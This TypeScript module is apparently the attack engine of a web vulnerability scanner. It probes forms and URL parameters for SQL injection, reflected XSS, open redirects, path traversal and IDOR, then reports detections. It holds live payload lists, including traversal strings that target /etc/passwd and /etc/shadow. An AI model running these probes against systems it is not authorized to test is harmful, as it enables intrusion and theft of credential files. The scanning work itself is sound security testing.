// ═══════════════════════════════════════════════════════════════
//  ATTACK ENGINE — Vulnerability Testing Per Page
//  SQL Injection, XSS, Open Redirect, Path Traversal, IDOR
// ═══════════════════════════════════════════════════════════════

import type { DiscoveredForm } from './spider';

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36';
const ATTACK_TIMEOUT = 6000;

export type AttackResult = {
  name: string;
  status: 'pass' | 'fail' | 'warn' | 'info';
  detail: string;
  risk: string;
  category: 'sqli' | 'xss' | 'redirect' | 'traversal' | 'idor' | 'header' | 'info';
  pageUrl: string;
};

// ─── Fetch Helper ───────────────────────────────────────────────
async function attackFetch(url: string, options: RequestInit = {}): Promise<{ status: number; body: string; headers: Headers; redirectUrl?: string } | null> {
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), ATTACK_TIMEOUT);
    const response = await fetch(url, {
      ...options,
      signal: controller.signal,
      redirect: 'manual', // Don't follow redirects for open redirect detection
      headers: { 'User-Agent': UA, ...(options.headers || {}) },
    });
    clearTimeout(timeout);
    const body = await response.text();
    const redirectUrl = response.headers.get('location') || undefined;
    return { status: response.status, body, headers: response.headers, redirectUrl };
  } catch {
    return null;
  }
}

// ═══════════════════════════════════════════════════════════════
//  SQL INJECTION TESTING (Error-based detection)
// ═══════════════════════════════════════════════════════════════
const SQL_PAYLOADS = [
  "' OR '1'='1",
  '" OR "1"="1',
  "1' AND '1'='1",
  "1; SELECT 1--",
  "' UNION SELECT NULL--",
];

const SQL_ERROR_SIGNATURES = [
  'sql syntax', 'mysql_', 'mysqli_', 'pg_query', 'pg_exec',
  'ora-', 'oracle error', 'odbc', 'microsoft ole db',
  'unclosed quotation mark', 'syntax error', 'sql error',
  'database error', 'query failed', 'sqlite_', 'sqlite3',
  'pdo::query', 'sqlstate[', 'sql server', 'mssql',
  'you have an error in your sql', 'supplied argument is not a valid',
  'unterminated string', 'quoted string not properly terminated',
  'warning: mysql', 'warning: pg_', 'warning: sqlite',
];

export async function testSQLInjection(form: DiscoveredForm): Promise<AttackResult[]> {
  const results: AttackResult[] = [];

  // Only test text-type fields (not passwords, hidden, submit, etc.)
  const testableFields = form.fields.filter(f =>
    ['text', 'search', 'email', 'url', 'tel', 'number'].includes(f.type)
  );

  if (testableFields.length === 0) {
    results.push({
      name: `SQLi — ${form.action}`,
      status: 'info',
      detail: 'No testable input fields found in form',
      risk: 'None', category: 'sqli', pageUrl: form.pageUrl,
    });
    return results;
  }

  let vulnerable = false;

  for (const payload of SQL_PAYLOADS.slice(0, 3)) { // Test first 3 payloads
    for (const field of testableFields.slice(0, 2)) { // Test first 2 fields
      try {
        const params = new URLSearchParams();
        for (const f of form.fields) {
          params.set(f.name, f.name === field.name ? payload : 'test');
        }

        let response: { status: number; body: string; headers: Headers } | null = null;

        if (form.method === 'GET') {
          const url = `${form.action}?${params.toString()}`;
          response = await attackFetch(url);
        } else {
          response = await attackFetch(form.action, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString(),
          });
        }

        if (response) {
          const bodyLower = response.body.toLowerCase();
          for (const sig of SQL_ERROR_SIGNATURES) {
            if (bodyLower.includes(sig)) {
              vulnerable = true;
              results.push({
                name: `SQLi — ${field.name} @ ${new URL(form.action).pathname}`,
                status: 'fail',
                detail: `SQL error detected with payload "${payload}" on field "${field.name}". Error signature: "${sig}"`,
                risk: 'Critical', category: 'sqli', pageUrl: form.pageUrl,
              });
              break;
            }
          }
        }

        if (vulnerable) break;
      } catch { /* skip */ }
    }
    if (vulnerable) break;
  }

  if (!vulnerable) {
    results.push({
      name: `SQLi — ${new URL(form.action).pathname}`,
      status: 'pass',
      detail: `No SQL injection detected in ${testableFields.length} fields`,
      risk: 'None', category: 'sqli', pageUrl: form.pageUrl,
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════════════
//  XSS TESTING (Reflected detection)
// ═══════════════════════════════════════════════════════════════
const XSS_PAYLOADS = [
  { payload: '<script>alert("XSSTEST")</script>', marker: '<script>alert("xsstest")</script>' },
  { payload: '"><img src=x onerror=alert("XSSTEST")>', marker: 'onerror=alert("xsstest")' },
  { payload: "'-alert('XSSTEST')-'", marker: "alert('xsstest')" },
];

export async function testXSS(form: DiscoveredForm): Promise<AttackResult[]> {
  const results: AttackResult[] = [];

  const testableFields = form.fields.filter(f =>
    ['text', 'search', 'email', 'url', 'tel'].includes(f.type)
  );

  if (testableFields.length === 0) return results;

  let vulnerable = false;

  for (const { payload, marker } of XSS_PAYLOADS.slice(0, 2)) {
    for (const field of testableFields.slice(0, 2)) {
      try {
        const params = new URLSearchParams();
        for (const f of form.fields) {
          params.set(f.name, f.name === field.name ? payload : 'test');
        }

        let response: { status: number; body: string; headers: Headers } | null = null;

        if (form.method === 'GET') {
          response = await attackFetch(`${form.action}?${params.toString()}`);
        } else {
          response = await attackFetch(form.action, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString(),
          });
        }

        if (response && response.body.toLowerCase().includes(marker)) {
          vulnerable = true;
          results.push({
            name: `XSS — ${field.name} @ ${new URL(form.action).pathname}`,
            status: 'fail',
            detail: `Reflected XSS detected: payload "${payload}" appears unescaped in response`,
            risk: 'Critical', category: 'xss', pageUrl: form.pageUrl,
          });
          break;
        }
      } catch { /* skip */ }
    }
    if (vulnerable) break;
  }

  if (!vulnerable && testableFields.length > 0) {
    results.push({
      name: `XSS — ${new URL(form.action).pathname}`,
      status: 'pass',
      detail: `No reflected XSS detected in ${testableFields.length} fields`,
      risk: 'None', category: 'xss', pageUrl: form.pageUrl,
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════════════
//  OPEN REDIRECT TESTING
// ═══════════════════════════════════════════════════════════════
const REDIRECT_PARAMS = ['redirect', 'url', 'next', 'return', 'returnUrl', 'return_to', 'goto', 'dest', 'destination', 'continue', 'redir', 'target'];
const EVIL_URL = 'https://evil.example.com';

export async function testOpenRedirects(pageUrl: string, knownParams: string[]): Promise<AttackResult[]> {
  const results: AttackResult[] = [];
  const paramsToTest = [...new Set([...REDIRECT_PARAMS, ...knownParams])];
  let found = false;

  for (const param of paramsToTest) {
    try {
      const testUrl = new URL(pageUrl);
      testUrl.searchParams.set(param, EVIL_URL);

      const response = await attackFetch(testUrl.toString());
      if (response && (response.status === 301 || response.status === 302 || response.status === 303 || response.status === 307)) {
        const location = response.redirectUrl || '';
        if (location.includes('evil.example.com')) {
          found = true;
          results.push({
            name: `Open Redirect — ?${param}`,
            status: 'fail',
            detail: `Redirects to external URL via "${param}" parameter. Location: ${location}`,
            risk: 'High', category: 'redirect', pageUrl,
          });
        }
      }
    } catch { /* skip */ }
  }

  if (!found) {
    results.push({
      name: 'Open Redirect',
      status: 'pass',
      detail: `Tested ${paramsToTest.length} redirect parameters — none exploitable`,
      risk: 'None', category: 'redirect', pageUrl,
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════════════
//  PATH TRAVERSAL TESTING
// ═══════════════════════════════════════════════════════════════
const TRAVERSAL_PAYLOADS = [
  { payload: '../../../../etc/passwd', signature: 'root:' },
  { payload: '..\\..\\..\\..\\windows\\win.ini', signature: '[extensions]' },
  { payload: '../../../../etc/shadow', signature: 'root:' },
  { payload: '....//....//....//etc/passwd', signature: 'root:' },
];

export async function testPathTraversal(pageUrl: string, params: string[]): Promise<AttackResult[]> {
  const results: AttackResult[] = [];
  let found = false;

  // Only test file-like parameters
  const fileParams = params.filter(p =>
    ['file', 'path', 'page', 'doc', 'document', 'template', 'include', 'dir', 'folder', 'load', 'read', 'download', 'img', 'image'].includes(p.toLowerCase())
  );

  if (fileParams.length === 0) return results;

  for (const param of fileParams) {
    for (const { payload, signature } of TRAVERSAL_PAYLOADS.slice(0, 2)) {
      try {
        const testUrl = new URL(pageUrl);
        testUrl.searchParams.set(param, payload);

        const response = await attackFetch(testUrl.toString());
        if (response && response.body.toLowerCase().includes(signature)) {
          found = true;
          results.push({
            name: `Path Traversal — ?${param}`,
            status: 'fail',
            detail: `Local file inclusion detected via "${param}" with payload "${payload}"`,
            risk: 'Critical', category: 'traversal', pageUrl,
          });
          break;
        }
      } catch { /* skip */ }
    }
    if (found) break;
  }

  if (!found && fileParams.length > 0) {
    results.push({
      name: 'Path Traversal',
      status: 'pass',
      detail: `Tested ${fileParams.length} file parameters — no traversal possible`,
      risk: 'None', category: 'traversal', pageUrl,
    });
  }

  return results;
}

// ═══════════════════════════════════════════════════════════════
//  IDOR TESTING (Insecure Direct Object Reference)
// ═══════════════════════════════════════════════════════════════
export async function testIDOR(pageUrl: string, params: string[]): Promise<AttackResult[]> {
  const results: AttackResult[] = [];

  // Find numeric ID parameters
  const parsed = new URL(pageUrl);
  const idParams = params.filter(p => {
    const val = parsed.searchParams.get(p);
    return val && /^\d+$/.test(val) && ['id', 'uid', 'user_id', 'userid', 'account', 'order', 'order_id', 'item', 'item_id', 'product', 'product_id', 'doc_id', 'invoice'].includes(p.toLowerCase());
  });

  if (idParams.length === 0) return results;

  for (const param of idParams) {
    const originalVal = parseInt(parsed.searchParams.get(param) || '0');
    try {
      // Fetch original
      const originalResponse = await attackFetch(pageUrl);
      if (!originalResponse || originalResponse.status !== 200) continue;

      // Try ID + 1
      const testUrl = new URL(pageUrl);
      testUrl.searchParams.set(param, String(originalVal + 1));
      const testResponse = await attackFetch(testUrl.toString());

      if (testResponse && testResponse.status === 200) {
        // Check if content is substantially different (different data exposed)
        const origLen = originalResponse.body.length;
        const testLen = testResponse.body.length;
        const diff = Math.abs(origLen - testLen);

        if (diff > 100 && testLen > 500) {
          results.push({
            name: `IDOR — ?${param}`,
            status: 'warn',
            detail: `Changing "${param}" from ${originalVal} to ${originalVal + 1} returns different content (${testLen} bytes). Potential unauthorized data access.`,
            risk: 'High', category: 'idor', pageUrl,
          });
        } else {
          results.push({
            name: `IDOR — ?${param}`,
            status: 'pass',
            detail: `Parameter "${param}" returns same/similar content for adjacent IDs`,
            risk: 'None', category: 'idor', pageUrl,
          });
        }
      }
    } catch { /* skip */ }
  }

  return results;
}

// ═══════════════════════════════════════════════════════════════
//  PER-PAGE SECURITY CHECK (headers + cookies + info disclosure)
// ═══════════════════════════════════════════════════════════════
import { SECURITY_HEADERS } from './scanChecks';

export function checkPageHeaders(responseHeaders: Record<string, string>, pageUrl: string): AttackResult[] {
  return SECURITY_HEADERS.map(h => {
    const val = responseHeaders[h.name] || responseHeaders[h.name.toLowerCase()];
    if (val) return { name: h.name, status: 'pass' as const, detail: `Present: ${val.substring(0, 80)}`, risk: 'None', category: 'header' as const, pageUrl };
    return { name: h.name, status: 'fail' as const, detail: `Missing — ${h.desc}`, risk: 'Medium', category: 'header' as const, pageUrl };
  });
}

// ═══════════════════════════════════════════════════════════════
//  BATCH ATTACK — Run all attacks on a set of pages
// ═══════════════════════════════════════════════════════════════
export type BatchAttackResult = {
  sqli: AttackResult[];
  xss: AttackResult[];
  openRedirects: AttackResult[];
  pathTraversal: AttackResult[];
  idor: AttackResult[];
  perPageHeaders: AttackResult[];
};

export async function attackPages(
  pages: { url: string; forms: DiscoveredForm[]; parameters: string[]; responseHeaders: Record<string, string> }[]
): Promise<BatchAttackResult> {
  const sqli: AttackResult[] = [];
  const xss: AttackResult[] = [];
  const openRedirects: AttackResult[] = [];
  const pathTraversal: AttackResult[] = [];
  const idor: AttackResult[] = [];
  const perPageHeaders: AttackResult[] = [];

  for (const page of pages) {
    // Per-page header check (only on first 10 pages to keep scan fast)
    if (perPageHeaders.length < 150) {
      perPageHeaders.push(...checkPageHeaders(page.responseHeaders, page.url));
    }

    // Form-based attacks
    for (const form of page.forms) {
      const sqliResults = await testSQLInjection(form);
      sqli.push(...sqliResults);

      const xssResults = await testXSS(form);
      xss.push(...xssResults);
    }

    // Parameter-based attacks
    if (page.parameters.length > 0) {
      const redirectResults = await testOpenRedirects(page.url, page.parameters);
      openRedirects.push(...redirectResults);

      const traversalResults = await testPathTraversal(page.url, page.parameters);
      pathTraversal.push(...traversalResults);

      const idorResults = await testIDOR(page.url, page.parameters);
      idor.push(...idorResults);
    }
  }

  return { sqli, xss, openRedirects, pathTraversal, idor, perPageHeaders };
}
